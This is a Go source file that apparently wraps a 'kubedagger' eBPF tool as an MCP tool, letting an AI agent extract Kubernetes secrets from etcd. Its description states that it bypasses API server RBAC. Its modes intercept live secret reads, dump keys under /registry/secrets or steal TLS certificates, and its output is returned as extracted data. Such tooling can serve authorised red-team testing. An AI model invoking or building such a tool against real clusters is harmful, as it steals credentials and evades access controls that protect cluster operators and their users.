package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type EtcdStealInput struct {
	Mode      string `json:"mode,omitempty"`
	KeyPrefix string `json:"key_prefix,omitempty"`
}

type EtcdStealTool struct {
	exec executor.Executor
}

func NewEtcdSteal(exec executor.Executor) *EtcdStealTool {
	return &EtcdStealTool{exec: exec}
}

func (t *EtcdStealTool) Name() string { return "kubedagger_etcd_steal" }

func (t *EtcdStealTool) Description() string {
	return "Extract secrets directly from etcd by intercepting the etcd server's read/write operations via eBPF. Bypasses Kubernetes API server RBAC entirely since it operates at the storage layer."
}

func (t *EtcdStealTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"mode": {
				"type": "string",
				"enum": ["intercept", "dump-keys", "steal-certs"],
				"description": "Extraction mode: intercept live reads, dump keys, or steal TLS certs (default: intercept)"
			},
			"key_prefix": {
				"type": "string",
				"description": "etcd key prefix to target (default: /registry/secrets)"
			}
		}
	}`)
}

func (t *EtcdStealTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input EtcdStealInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.KeyPrefix, "key_prefix"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"etcd-steal"}
	if input.Mode != "" {
		args = append(args, "--mode", input.Mode)
	}
	if input.KeyPrefix != "" {
		args = append(args, "--key-prefix", input.KeyPrefix)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger etcd-steal failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Etcd Steal\n\n")
	if output == "" {
		sb.WriteString("No data extracted.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
